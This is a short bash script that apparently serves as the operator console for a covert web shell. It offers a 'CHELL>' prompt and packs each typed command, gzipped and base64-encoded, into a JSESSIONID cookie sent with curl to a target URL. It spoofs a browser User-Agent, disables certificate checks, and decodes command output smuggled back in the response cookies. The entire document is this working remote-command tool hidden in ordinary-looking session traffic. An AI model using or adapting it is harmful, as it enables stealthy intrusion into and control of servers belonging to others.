echo "Press <CTRL+C> to exit."
while :
do
echo -n "CHELL>"
read cmd
echo "$cmd" > comp
gzip -f comp
curl --cookie-jar cookies.txt -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" $1 -b "JSESSIONID=$(cat comp.gz | base64)" -s -k
cat cookies.txt | cut -f7 | tail -n +5 | sed 's/%3D/=/g' | sed 's/%2F/\//g' | sed 's/%2B/+/g' |base64 -d > decom.txt && gunzip -cd decom.txt
echo ""
done
